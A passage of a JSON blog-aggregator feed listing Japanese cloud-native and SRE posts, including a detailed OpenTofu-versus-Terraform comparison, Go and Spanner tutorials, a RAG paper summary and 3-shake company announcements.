\\rhttps://github.com/cncf/artwork/blob/main/projects/ko/stacked/color/ko-stacked-color.png \\rhttps://github.com/cncf/artwork/blob/main/projects/ko/icon/color/ko-icon-color.png","isoDate":"2025-02-19T05:00:00.000Z","dateMiliSeconds":1739941200000,"authorName":"bells17","authorId":"bells17"},{"title":"CNCFの公式ブログ「Japan’s CNCF DevStats 2024」にて、スリーシェイク所属のエンジニア2名がCNCFプロジェクトでの貢献者TOP10にランクイン","link":"https://sreake.com/blog/rank-among-top-contributors-to-cncf-projects-in-japan/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、 CNCF（Cloud Native Computing Foundation）の公式ブログ「Japan’s CNCF DevStats 2024」にて、スリーシェイク所属のエンジニア 早川大貴・長澤翼（以下早川・長澤）がCNCFプロジェクトでの貢献者TOP10にランクインしたことをお知らせします。The post CNCFの公式ブログ「Japan’s CNCF DevStats 2024」にて、スリーシェイク所属のエンジニア2名がCNCFプロジェクトでの貢献者TOP10にランクイン first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-02-18T01:00:00.000Z","dateMiliSeconds":1739840400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"AWS SAM と GitHub Actions で爆速でサーバーレス API をデプロイする","link":"https://sreake.com/blog/aws-sam-quick-deploy-with-github-actions/","contentSnippet":"こんにちは。スリーシェイクの小林です。 本日は AWS Serverless Application Model（以下、AWS SAM）と GitHub Actions を用いて サーバーレス API の作成からデプロイ […]The post AWS SAM と GitHub Actions で爆速でサーバーレス API をデプロイする first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-02-16T23:00:00.000Z","dateMiliSeconds":1739746800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"goroutineによる頻出並行処理パターン2選","link":"https://zenn.dev/kamos/articles/c334faad2d3b33","contentSnippet":"はじめにgoruotineはgo言語の軽量スレッドの仕組みであり、並行処理が比較的簡単に実装できます。しかしその自由度の高さから、慣れていない人にとってはどのように実装したらよいのか、という迷いが生まれてしまいます。その中でもよく使う並行処理のパターンは決まっており、今回はよく自分が使うパターンを2つ紹介します。 前提こういう遅くて、エラーも起こる関数をテーマにします。func slowFunction(arg string) (string, error) {\\tfmt.Printf(\\"SLOW FUNCTION START: %s\\\\n\\", arg)\\tstart :=...","isoDate":"2025-02-16T08:56:32.000Z","dateMiliSeconds":1739696192000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"自分ばっかり大変と思ってるときは気をつけたほうがいい","link":"https://nnaka2992.hatenablog.com/entry/2025/02/16/140946","contentSnippet":"仕事をしていて数年ほどたつと自分はこんなに頑張ってるのに評価が低いと思うタイミングが来る。これは後々そんなことはなかったと気がつくものの、そのタイミングにいる間は不適当な評価を受けていると思いがちで、自尊心が肥大しがちである。自分ばっかり頑張っていると感じたときは、自分の仕事が本当に価値を生んでいるのかという観点に立ち返ったほうがいい。やらなくてもいい仕事に忙殺されていないか？ 楽してると思ってる人は本質的な仕事に集中しているのではないか？これはイシューからはじめよでいうところの犬の道に陥っている状態である。自分だけ大変と思っているときは、実際には価値を生み出していないにも限らず、仕事量によ達成感を成果と勘違いしていることが多い。自分ばっかり大変だ、となっているときは価値の低いことに時間を投入していないか見つめ直そうという自戒。","isoDate":"2025-02-16T05:09:46.000Z","dateMiliSeconds":1739682586000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"【基礎】 GoでSpannerを使う","link":"https://zenn.dev/kamos/articles/b06c3ef3de894a","contentSnippet":"はじめにGoogleのSpannerデータベースはまだまだ知名度が低く、日本語での文献も豊富ではないため、いざ使うとなるとかなり苦労する技術です。ここでは最低限の概念を説明することにつとめ、通常利用においてSpannerのハードルを下げようと思いこの記事を執筆しました。基本的には以下の資料に載っている情報かと思いますが、実際にソースコードを見るとドキュメントの更新が追いついていない部分が多い印象でした。そのためクライアントライブラリのソースコードに可能な限り追従し、できるだけ平易な文章でまとめようと思います。https://cloud.google.com/spanner/do...","isoDate":"2025-02-16T03:29:52.000Z","dateMiliSeconds":1739676592000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"インフラをつくるとはどういうことなのか、 あるいはPlatform Engineeringについて","link":"https://speakerdeck.com/nwiizo/inhurawotukurutohadouiukotonanoka-aruihaplatform-engineeringnituite","contentSnippet":"2025年02月13日 Developers Summit 2025 13-E-4 にて「インフラをつくるとはどういうことなのか、 あるいはPlatform Engineeringについて - Platform Engineeringの効果的な基盤構築のアプローチ」というタイトルで登壇します。同日にPFEM特別回 でも登壇するのですが資料頑張って作ったのでそっちも読んでください。完全版は機会があればお話するので依頼してください。\\r\\rイベント名:  Developers Summit 2025\\r\\r公式URL: https://event.shoeisha.jp/devsumi/20250213\\r\\rセッションURL: https://event.shoeisha.jp/devsumi/20250213/session/5546\\r\\r登壇ブログ: https://syu-m-5151.hatenablog.com/entry/2025/02/14/071127","isoDate":"2025-02-13T05:00:00.000Z","dateMiliSeconds":1739422800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"国内４大通信キャリアのビジネスまとめ表","link":"https://qiita.com/masaru-komiyama/items/07b8eec241e41c1e0ebb","contentSnippet":"ふと、「国内通信キャリア各社のビジネスってどうなってるんだろう。サクッと確認したいからまとまった表があるといいなぁ」　と検索した際、あまり良い情報がヒットしなかった ＆ AI使っても微妙な結果しか得られなかったので、各社の公開情報を参考に、2025/2/12時点での、国内４...","isoDate":"2025-02-13T01:24:19.000Z","dateMiliSeconds":1739409859000,"authorName":"masaru-komiyama","authorId":"masaru-komiyama"},{"title":"Platform Engineeringは自由のめまい ","link":"https://speakerdeck.com/nwiizo/platform-engineeringhazi-you-nomemai","contentSnippet":"2025年02月13日 Kubernetesで実践するPlatform Engineering発売記念！ PFEM特別回にて「Platform Engineeringは自由のめまい - 技術の選択における不確実性と向き合う」というタイトルで登壇します。同日にDevelopers Summit 2025 でも登壇したのですが資料頑張って作ったのでそっちも読んでください。\\r\\rイベント名: Kubernetesで実践するPlatform Engineering発売記念！ PFEM特別回\\r\\r公式URL: https://platformengineering.connpass.com/event/342670/\\r\\r登壇ブログ: https://syu-m-5151.hatenablog.com/entry/2025/02/14/071127","isoDate":"2025-02-12T05:00:00.000Z","dateMiliSeconds":1739336400000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"kubeadmでk8sクラスタを構築する","link":"https://zenn.dev/moz_sec/articles/k8s-by-kubeadm","contentSnippet":"KubernetesKubernetesとは、複数のコンピュータでコンテナをいい感じに動かしてくれるものです。Kubernetesの説明はいろんなサイトに書いてあるため、そちらを参照してください。公式サイトも参考になります。https://kubernetes.io/docs/concepts/overview/ kubeadmkubeadmは、Kubernetesクラスタを構築するためのツールの１つです。他にも、kopsやkubesprayなどがありますが、kubeadmは最小限の構成でクラスタを構築することができます。https://kubernetes.io/...","isoDate":"2025-02-07T02:00:09.000Z","dateMiliSeconds":1738893609000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"GKEのComputeClassに関する調査","link":"https://sreake.com/blog/gke-computeclass/","contentSnippet":"はじめに Sreake事業部で長期インターンをしている竜です。 本記事では、GKEのカスタムコンピューティングクラスについて調査を行いました。 カスタムコンピューティングクラスの概要 GKEのカスタムコンピューティングク […]The post GKEのComputeClassに関する調査 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-02-07T00:00:00.000Z","dateMiliSeconds":1738886400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Kubernetes History Inspector(KHI)を触ってみた","link":"https://speakerdeck.com/bells17/kubernetes-history-inspector-khi-wohong-tutemita","contentSnippet":"スライド内の参考リンク・画像など引用元一覧\\r\\rhttps://zenn.dev/bells17/scraps/67c852e99ad5a5 \\rhttps://github.com/GoogleCloudPlatform/khi \\rhttps://zenn.dev/google_cloud_jp/articles/9a7dc0df5e8906 \\rhttps://blog.g-gen.co.jp/entry/kubernetes-history-inspector-introduction \\rhttps://x.com/kyasbal_k/status/1884500133183905976 \\rhttps://x.com/ryusa_eng/status/1886328704432996463 \\rhttps://x.com/kkuchima/status/1884503826029228189 \\rhttps://github.com/GoogleCloudPlatform/khi/blob/main/docs/en/images/gettingstarted-history.png\\rhttps://github.com/GoogleCloudPlatform/khi/blob/main/docs/en/images/gettingstarted-views.png \\rhttps://k8s-novice-jp.connpass.com/event/343899/ \\rhttps://jaguer-cloud-native.connpass.com/event/342024/","isoDate":"2025-02-05T05:00:00.000Z","dateMiliSeconds":1738731600000,"authorName":"bells17","authorId":"bells17"},{"title":"Terraform使いがOpenTofuについて入門してみる","link":"https://blog.masasuzu.net/entry/2025/02/04/185305","contentSnippet":"この記事はSRETT #11で発表されたものに加筆修正したものです。OpenTofuに関して調べたこととなります。3-shake SRE Tech Talk #11 オンサイト - connpass speakerdeck.com先日KubeCon + CloudNativeCon North America 2024に行ってきてました。その中で共同開催されていたOpenTofu Dayを見てOpenTofuに関して興味を持ちました。普段はTerraformを利用しており、あまりOpenTofuについては触ってきてないので、この機会に深堀りをしてみたいと思いました。参考: OpenTofu Dayまた、社内活動として技術検証を行っており、私の検証テーマとしてTerraformを中心としたIaC周りの技術調査を行ってるので、ちょうどいい機会だとも思いました。おことわりOpenTofuとはライセンス問題HashiCorp社の言い分コミュニティの懸念OpenTofuとTerraformの違いコマンドファイルRegistryremovedブロックState Encryptionbackendブロックの変数参照バージョン管理Security checkLinterCI/CDまとめ参考リンクライセンス変更フォークソースコード問題OpenTofuを使うためにHachiCorp買収おことわりこの記事はTerraformを知っている前提で書かれています。そのため細かい説明を省略している箇所があります。また筆者は普段はTerraformをメインで使用しており、OpenTofuを業務利用はしていません。OpenTofuとは2023年8月にTerraformを含めたHashiCorp製品のライセンスの変更を発表したことにより、これを懸念した企業やコミュニティによりOpenTFとしてフォークされます。その後OpenTFの名称はHashiCorp社の商標権への懸念からOpenTofuに改名されます。そのときの議論はissueを見るとたどることができます。参考: https://github.com/opentofu/opentofu/issues/2962023年9月にLinux Foundation傘下となります。参考: Linux Foundation Launches OpenTofu: A New Open Source Alternative to TerraformTerraformをフォークしたものなので基本的な使い勝手は同じです。コマンド名が terraform から  tofu に差し替えられています。ライセンス問題前項でさらっとライセンス変更と言いましたが、HashiCorp社は2023年8月に今後のリリースに関してライセンスを変更する旨を発表しました。これはオープンソースライセンスであるMozilla Public License（MPL） v2.0から商用サービスでの利用を制限するBusiness Source License（BUSLあるいはBSL） v1.1に変更するものです。参考: HashiCorp adopts Business Source Licenseこれに対して、利用企業およびコミュニティが懸念を示し、OpenTofuをフォークしたという流れになります。HashiCorp社の言い分従来BSLは本番使用(production use)が制限されます。ただし、ライセンスのParameterとして追加使用許可(Additional Use Grant)をすることによりTerraformと「競合製品」でなければ本番利用の制限はないとしてます。参考: https://github.com/hashicorp/terraform/blob/v1.11/LICENSE「競合製品」とは、有料サポート契約を含む第三者に販売される製品で、HashiCorp のライセンス対象製品の有料版の機能と大幅に重複する製品を指します。TerraformでいうところのHCP Terraform(Terraform Cloud)を想定しているのかと思います。また組織内でTerraformをホストして利用することは「競合製品」とはみなされなません。そのため利用者としては基本的には問題なく利用できるとしてます。参考: HashiCorp Licensing FAQ問題となるのはTerraformの機能を有償で提供しているSaaSと読み取れます。コミュニティの懸念HashiCorp社が説明したBSLと追加使用許可はあいまいであるとしてます。そのため、自身の行動が許諾範囲内か判断が困難である。「競合製品」の定義やライセンス自体が今後変更されるか不確実であると懸念を示してます。また、TerraformはOSSの恩恵を受けて成長してきてため、これからもオープンソースソフトウェアであるべきだと信じていると表明しています。参考: OpenTofu FAQOpenTofuのスポンサー企業としては以下のとおりです。HarnessGruntworkSpaceliftenv0ScalrHarnessはCI/CDまわりのSaaS製品、Gruntworksはterragruntの開発元、Specelift、env0、ScalrはTerraformをホストするSaaSサービスを運営しています。OpenTofuとTerraformの違いこの項ではそれぞれの違いについて説明していきます。OpenTofuはTerraform1.6-alphaからフォークされているのでそれまでに実装されていたものは互換があります。また、Terraform 1.6以降に追加された機能に関しても随時取り込まれています。そのため、1.5までの機能を使っているのであれば素直に移行できるかとは思います。バージョンごとに移行ガイドがあるので細かくはそれを参照すると良いです。参考: https://opentofu.org/docs/intro/migration/ただし、別のコードベースで開発がされているので、OpenTofuのみの独自実装もあります。ここではいくつか個人的に気になる違いについてあげていきます。コマンド基本的には terraform を tofuに置き換えていただければよいです。サブコマンドは一緒です。# Terraformterraform initterraform planterraform applyterraform destroy# OpenTofutofu inittofu plantofu applytofu destroyファイルterraform由来の .tf または .tofu の拡張子のファイルを設定ファイルとして認識します。json形式の .tf.json または .tofu.json の拡張子のファイルも同様です。同じディレクトリ内に.tf と .tofu の両方のファイルがあった場合、.tofu ファイルだけ認識して、.tf ファイルは無視されます。foo.tf  # <=== このファイルは無視されるfoo.tofuRegistryTerraform同様OpenTofuにもプロバイダーやモジュールのレジストリがあります。Terraform: https://registry.terraform.io/OpenTofu: https://registry.opentofu.orgOpenTofu Registryが登場したときに存在したTerraform Providerは反映されています。反映されていないものに関してもissueを立てれば反映されるようですhttps://github.com/opentofu/registryremovedブロックremovedブロックは既存のリソースを削除することなく、stateから削除することができます。それぞれ下記のように記述できます。下記の例ではAWSインスタンス自体は削除せず、stateから外すことを意図してます。# Terraformremoved {  from = aws_instance.example  lifecycle {    destroy = false  }}# OpenTofuremoved {  from = aws_instance.example}Terraformではlifecyleブロックでdestroy=falseの記述が必須です。参考: https://developer.hashicorp.com/terraform/language/resources/syntax#removing-resourcesOpenTofuではremovedブロックを書くだけで stateから削除されます。参考: https://opentofu.org/docs/language/resources/syntax/#removing-resourcesremovedブロックでやりたいことはstateから削除することなので、単純にリソースを削除したいなら対象resouceブロックを削除すればいいので、Terraformの記述方法のほうがへんな気がします。State EncryptionTerraformでは平文でStateに保存されてしまうという問題がありましたが、OpenTofuではクライアントサイドで暗号化する機能が追加されてます。クラウドプロバイダーの KMSキーなどを利用してStateを暗号化することができます。参考: State and Plan Encryption | OpenTofuTerraformではたとえsopsプロバイダーで機密情報を暗号化しても、Stateファイルには平文で保存されているので権限があれば機密情報が見えてしまう状態にありました。State自体が暗号化されることにより機密情報をよりセキュアに扱えるようになります。参考: Terraformのsopsプロバイダーを使用するだけで機密情報は守られるのか - 目の前に僕らの道があるbackendブロックの変数参照OpenTofuではbackendブロックで変数参照ができます参考: https://opentofu.org/docs/language/settings/backends/configuration/#variables-and-localsvariable \\"env\\" {  type    = string}locals {  path = \\"${var.env}/terraform.tfstate\\"}terraform {  backend \\"local\\" {    path = local.path  }}tofu init -var=\\"env=dev\\" -reconfiguretofu plan -var=\\"env=dev\\"Terraformで同じことをしたい場合、-backend-configを渡さないといけないため、backendを切り替える際に不便となります。terraform init -backend-config=./envs/dev/terraform.backend -reconfigureterraform plan -vars-file=./envs/dev/terraform.tfvarsOpenTofu DayのLTで紹介されてた環境名だけを渡して挙動を切り替えるパターンが現状だとterraformでは使えません参考:On Best Practices with OpenTofu Structuringバージョン管理複数プロジェクトでTerraform or OpenTofuを使う場合、プロジェクトごとに使用バージョンを管理する必要があります。いくつか選択肢を見ていきます。Terraformのバージョン管理ツールとしてよく使われるtfenvはOpenTofuには対応しません。参考:https://github.com/tfutils/tfenv/issues/409代わりにTerraformとOpenTofuに対応したtenvができました。こちらを利用すると良さそうです。https://github.com/tofuutils/tenv私はTerraformも合わせてプロジェクト内のツールのバージョン管理をまとめてasdfでやってますが、こちらは対応しています。https://github.com/virtualroot/asdf-opentofu自分はあまり使わないのですが、同じようなツールのaquaやmiseも両対応しています。https://aquaproj.github.io/https://github.com/jdx/miseSecurity checkTerraformだとtfsec(現 trivy config)がセキュリティチェックとして使われてるかと思います。ディスカッションはされており優先順位をつけて対応するとのことです。参考: https://github.com/aquasecurity/trivy/discussions/5069LintertflintはOpenTofuをサポートしないようです。参考: https://github.com/terraform-linters/tflint/issues/2037Linterの議論自体はissueで続いているようです。参考: https://github.com/opentofu/opentofu/issues/2213CI/CDHCP Terraform(旧Terraform Cloud)に相当するSaaSとしては、OpenTofuスポンサーのSpacelift、env0、Scalrなどがあります。tfactions、atlantis、diggerもOpenTofuに対応している模様です。まとめ現時点でOpenTofuに移行するするべきか?の問については、利用者側として現状では引き続き様子見かと思います。足回りも概ね揃ってきているが、まだ足りないエコシステムもあります。気になるところではIBM社にHashiCorp社の買収による統合完了の様子も追っていきたいところです。予定では2025年の1-3月期に統合完了するとのことなので、その後なにか動きがあるかもしれません。参考: IBM社によるHashiCorp社買収についてとはいえ、1つのツールが使えなくなることで業務が止まるのは避けたいので常に選択肢は複数取っておきたいところです。エンジニアとしてはOpenTofuに限らず、Pulumi、CDK(AWS)なども選択肢として取っておきたいです。それはそれとして、OpenTofuはTerraformとは違う独自進化をしているので、変更を追っていきたいところです。個人的にはState暗号化とかBackendの変数参照とかTerraformに入ってほしいです。それでは良い豆腐ライフを!、、、。ここまで書いてきたのですが、minamijoyoさんのTerraform職人のためのOpenTofu再入門2024がものすごく詳しいので、この記事以上に参考になるかと思います。参考リンクライセンス変更HashiCorp adopts Business Source LicenseHashiCorp | The Infrastructure Cloud CompanyHashiCorp、全製品のライセンスを商用利用に制限があるBSLライセンスに変更すると発表 － PublickeyTerraformのライセンスの変更とその影響何故、TerraformのBUSL-1.1へのライセンス変更は反発を受けたのか？ – Shuji SadoTerraform のライセンス変更についての考察 #Azure - QiitaフォークTerraformのフォークが「OpenTofu」としてLinux Foundation傘下で正式ローンチ。OpenTFから改名 － Publickeyソースコード問題【Infostand海外ITトピックス】ライセンスをめぐって対立　HashiCorpと「Terraform」派生のOpenTofu - クラウド WatchHashiCorp、TerraformをフォークしたOpenTofuに対しコードの不正コピーを警告。OpenTofuは完全否定 － PublickeyOpenTofuを使うためにTerraform職人のためのOpenTofu再入門2024 #Terraform - QiitaTerraform職人のためのOpenTofu入門 #Terraform - QiitaOpenTofuopentofu/opentofu: OpenTofu lets you declaratively manage your cloud infrastructure.Migrating to OpenTofu 1.7.x from Terraform | OpenTofuHachiCorp買収IBMがHashiCorpを64億ドルで買収、TerraformとAnsibleのシナジー効果などを見込む | IT LeadersIBM Japan Newsroom - ニュースリリースIBM社によるHashiCorp社買収について","isoDate":"2025-02-04T09:53:05.000Z","dateMiliSeconds":1738662785000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"スリーシェイク、「Developers Summit 2025」にて出展・登壇、および書籍「Kubernetesで実践するPlatform Engineering」の先行販売・サイン会を実施","link":"https://sreake.com/blog/developers-summit-2025/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、2025年2月13日（木）・14日（金）に開催される「Developers Summit 2025」にSRE総合支援サービス「Sreake（スリーク）」のブースを出展します。The post スリーシェイク、「Developers Summit 2025」にて出展・登壇、および書籍「Kubernetesで実践するPlatform Engineering」の先行販売・サイン会を実施 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-02-04T01:00:00.000Z","dateMiliSeconds":1738630800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"2025-01-31 吉祥寺.pm 37 初めての海外カンファレンス","link":"https://speakerdeck.com/masasuzu/2025-01-31-ji-xiang-si-dot-pm-37-chu-metenohai-wai-kanhuarensu","contentSnippet":"KubeCon NA 2024に行ってきたのでその経験を話します。\\r\\r吉祥寺.pm 37で話しました。\\rhttps://kichijojipm.connpass.com/event/339040/","isoDate":"2025-01-31T05:00:00.000Z","dateMiliSeconds":1738299600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"AWS Lambda Web Adapter の Function URL を Cloudfront で公開する","link":"https://blog.1q77.com/2025/01/aws-lambda-web-adapter-with-cloudfront/","contentSnippet":"これまでのおさらい前回、AWS Web Adapter を用いた AWS Lambda に Function URL を使って公開することはできた。今回はこれをカスタムドメインで公開するべく CloudFront と連携させます。OAC (Origin Access Control)2024年4月に CloudFront と Function URL の間を OAC (Origin Access Control) を使って Function URL への直アクセスを防ぐことができるようになっていたのでこれも試します。Amazon CloudFront が Lambda 関数 URL オリジンのオリジンアクセスコントロール (OAC) を新たにサポート","isoDate":"2025-01-30T15:01:24.000Z","dateMiliSeconds":1738249284000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"AWS Lambda Web Adapter でお手軽 Web Service 公開","link":"https://blog.1q77.com/2025/01/aws-lambda-web-adapter/","contentSnippet":"ずっと AWS にも Cloud Run が欲しいなあと思っていました。AppRunner はコレじゃない…そんなある日、あれ？ AWS Lambda でいけんじゃね？と思い検索すると","isoDate":"2025-01-29T15:40:00.000Z","dateMiliSeconds":1738165200000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Renovate を手元の repository に対して debug 実行する","link":"https://blog.1q77.com/2025/01/renovate-local-debug/","contentSnippet":"renovate の設定を手元で試行錯誤したい時のメモです。Local Platform--platform=local を指定して実行すると local filesystem を対象として renovate を実行することができます。https://docs.renovatebot.com/modules/platform/local/手元の working copy の root directory で実行します。(npx は使わなくても良いが install からやってくれるので)","isoDate":"2025-01-28T10:45:08.000Z","dateMiliSeconds":1738061108000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"論文紹介 ”Long-Context LLMs Meet RAG: Overcoming Challenges for Long Inputs in RAG” @GDG Tokyo","link":"https://speakerdeck.com/shukob/lun-wen-shao-jie-long-context-llms-meet-rag-overcoming-challenges-for-long-inputs-in-rag-at-gdg-tokyo","contentSnippet":"https://gdg-tokyo.connpass.com/event/340671/\\r\\r大規模言語モデル（LLM）は、外部の知識源を利用することで、より強力な応答を生成できるようになります（これをRetrieval-Augmented Generation: RAGと呼びます）。LLMが処理できる入力テキストの長さが長くなるにつれて、より多くの関連情報をRAGで与えられるようになり、生成される回答の質が向上することが期待されます。一般的には、取得する情報が多いほど関連情報（高い再現率）も増え、結果として性能が向上すると考えられます。\\r\\rしかし、長文処理LLMにおけるRAGの性能が、取得する情報が増えすぎると逆に低下する現象を明らかにし、その原因が「ハードネガティブ」な情報にあることを示しました。そして、その問題を解決するために、効果的な学習不要および学習を伴うアプローチを提案しています。","isoDate":"2025-01-28T05:00:00.000Z","dateMiliSeconds":1738040400000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Site Reliability Engineering on Kubernetes","link":"https://speakerdeck.com/nwiizo/site-reliability-engineering-on-kubernetes","contentSnippet":"2025年01月26日 10:35-11:05（ルーム A）にて「Site Reliability Engineering on Kubernetes」というタイトルで登壇します。\\r\\rイベント名: SRE Kaigi 2025\\r\\r公式URL: https://2025.srekaigi.net/\\r\\rセッションURL: https://fortee.jp/sre-kaigi-2025/proposal/a75769d1-7835-4762-a1f6-508e714c8c8e\\r\\r登壇ブログ: https://syu-m-5151.hatenablog.com/entry/2025/01/26/005033","isoDate":"2025-01-26T05:00:00.000Z","dateMiliSeconds":1737867600000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"スリーシェイクにおけるOSSの取り組み","link":"https://speakerdeck.com/bells17/surisieikuniokeruossnoqu-rizu-mi","contentSnippet":"3-shake SRE Tech Talk #11 オンサイトの登壇資料です。\\r\\rhttps://3-shake.connpass.com/event/339212/","isoDate":"2025-01-24T05:00:00.000Z","dateMiliSeconds":1737694800000,"authorName":"bells17","authorId":"bells17"},{"title":"OpenClarityを覗いてみる","link":"https://speakerdeck.com/kojake_300/openclaritywosi-itemiru","contentSnippet":"","isoDate":"2025-01-24T05:00:00.000Z","dateMiliSeconds":1737694800000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"2025-01-24-SRETT11-OpenTofuについてそろそろ調べてみるか","link":"https://speakerdeck.com/masasuzu/2025-01-24-srett11-opentofunituitesorosorodiao-betemiruka","contentSnippet":"OpenTofuについて調べてみた内容\\r\\rSRETT #11 https://3-shake.connpass.com/event/339212/","isoDate":"2025-01-24T05:00:00.000Z","dateMiliSeconds":1737694800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"論文紹介 ”Long-Context LLMs Meet RAG: Overcoming Challenges for Long Inputs in RAG”","link":"https://speakerdeck.com/shukob/lun-wen-shao-jie-long-context-llms-meet-rag-overcoming-challenges-for-long-inputs-in-rag","contentSnippet":"https://genai-users.connpass.com/event/341391/\\r\\r大規模言語モデル（LLM）は、外部の知識源を利用することで、より強力な応答を生成できるようになります（これをRetrieval-Augmented Generation: RAGと呼びます）。LLMが処理できる入力テキストの長さが長くなるにつれて、より多くの関連情報をRAGで与えられるようになり、生成される回答の質が向上することが期待されます。一般的には、取得する情報が多いほど関連情報（高い再現率）も増え、結果として性能が向上すると考えられます。\\r\\rしかし、長文処理LLMにおけるRAGの性能が、取得する情報が増えすぎると逆に低下する現象を明らかにし、その原因が「ハードネガティブ」な情報にあることを示しました。そして、その問題を解決するために、効果的な学習不要および学習を伴うアプローチを提案しています。","isoDate":"2025-01-21T05:00:00.000Z","dateMiliSeconds":1737435600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"スリーシェイクのエンジニアが翻訳を担当した『Kubernetesで実践する Platform Engineering』が2月19日に発売","link":"https://sreake.com/blog/platform-engineering-in-practice-with-kubernetes/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、当社エンジニア4名が翻訳を担当した『Kubernetesで実践する Platform Engineering』が翔泳社より2025年2月19日に発売されることをお知らせします。The post スリーシェイクのエンジニアが翻訳を担当した『Kubernetesで実践する Platform Engineering』が2月19日に発売 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-01-14T01:00:00.000Z","dateMiliSeconds":1736816400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"interface、structで書くか、functionで書くか","link":"https://zenn.dev/kamos/articles/e044ae9cbb9f4c","contentSnippet":"始めにこの正月に、関数型ドメインモデリングという本を読みました。良書でした。https://amzn.asia/d/4NlwXFgそこで、今までオブジェクトで書いていたコードを関数としてかけないか?という思いつきでこの記事を書いた結果、なんだか関数型とは関係ない感じの記事になってしまいました。ご容赦ください。 ベースとなるサンプルコードまずはオブジェクト指向でよく使う形のサンプルを用意しました。タスク管理のモデルです。簡単のため、エラーなどはあまり返さないようにしています。domain/user.gopackage domainimport \\"fmt\\"typ...","isoDate":"2025-01-12T08:31:09.000Z","dateMiliSeconds":1736670669000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"2024年の振り返りをする","link":"https://nnaka2992.hatenablog.com/entry/2024/12/31/2024_furikaeri","contentSnippet":"みんな振り返りしてる。振り返りしてないのはお前だけ。なので振り返りします。登壇関係2024-03-29 3-shake SRE Tech Talk #9 - connpass2024年の登壇はじめは所属会社である株式会社スリーシェイクの主催するイベントでした。データベーススペシャルということでDB関連がメインの回で、メインセッションとして30分枠で登壇しました。内容はo11yとデータベースを主軸とした話です。個人的には今後データベースのスロークエリ検知は従来のスロークエリログを利用する方法からo11yのトレースを通して発見していく方法が主流になるのではと思っています。データベースにオブザーバビリティを注入する - Speaker DeckSRETTというイベントがインフラ・SRE・アプリケーション側の試聴者が多いだろうと考えて、少しアプリ・SREよりの内容にしようとo11yをメインに据えた記憶があります。2024-04-26 YugabyteDB Japan Meetup #3登壇はじめからはなかなかのハイペースで、1ヶ月経たないうちにGoogle CloudのコミュニティであるJagu\'e\'rでの登壇です。やはりここもDBREの文脈でデータベースでブルーグリーンをできるようにしようという内容です。Jagu\'e\'r Observability-SRE分科会 Meetup#7 ハイブリッド - connpassGoogle CloudのDBにもAWS RDSのブルーグリーン相当の機能が欲しいです。2024-06-05 Google Cloud非公開イベントGoogle Cloudがパートナー向けに開催している非公開イベントでの登壇でした。2024年4月のGoogle Cloud Nextで発表された「全てのDBにベクトル検索を搭載します」という内容に衝撃を受けて、話した内容だった気がします。確かにすごいですが、全部のDBに必要なのかと問われると疑問です。Google Cloud で利用できるRDBのベクトル検索を徹底解剖！ - Speaker Deck結論としては特別な理由がなければCloud SQLを使え、です。2024-07-17 YugabyteDB Japan Meetup #5 - connpass約1年ぶりのYugabyteDB Japan Meetupのリベンジ登壇です。初回がなぜかDBREの話をしてYugabyteDBの話はフレーバー程度になってしまったので、本腰を入れてYugabyteDBならではの話をしました。大規模マルチテナントを解決するYugabyteDBという選択肢 - Speaker DeckYugabyteDBはメジャーなNewSQLでは唯一RLSをサポートしており、スケールアウトとセキュリティを両立したデータベースなので大規模マルチテナントの最適解では？　という内容です。この考えはAurora DSQLの登場でも意見は変わりませんが、Limitlessでいいのでは？　という気持ちはあります。2024-08-30 Jagu\'e\'r Cloud Native #15 ハイブリッド Meetup - connpass2024年2回目のJagu\'e\'rでの登壇でした。Google Cloudと不仲と噂されていたOracleの関係改善に驚いた結果話した内容です。やっていることはシンプルでOracle DBをKubernetesでうごかすOperatorを紹介しています。GoogleとOracle：この二人は友達になれました～GKEでOraOperatorを動かそう～ - Speaker Deckこの9月末まではGoogle Cloudのパートナーエンジニア表彰プログラムである、Google Cloud Partner Top Engineerの評価期間であったためGoogle Cloudに偏重した登壇を行っていました。2024-10-01 Kubernetes Novice Tokyo #34 - connpassJagu\'e\'r Cloud Native #15で登壇した内容を一部保管しつつ、されつつといった内容の登壇でした。@bells17_が運営のひとりなのでOracle DB on Kubernetesの話をするので早く開催してくださいとプレッシャーをかけた覚えがあります。その節はお世話になりました。登壇した直後にOracle DBの話しすぎて、Kubernetesユーザーからするとちょっと違うなという話をしてしまったと反省した記憶があります。Kubernetes上でOracle_Databaseの運用を楽にするOraOperatorの紹介 - Speaker Deckこの時期はOracle DB x Kubernetesの熱が上がりましたが、今はそこまででもありません。今はやっぱりPostgreSQLだとCloud NativePGに熱を上げてます。2024-12-17 Database Engineering Meetup #5 - connpass2024年の登壇納はDatabase Engineering Meetupでした。ちょうど11月下旬ごろにKubeCon NA 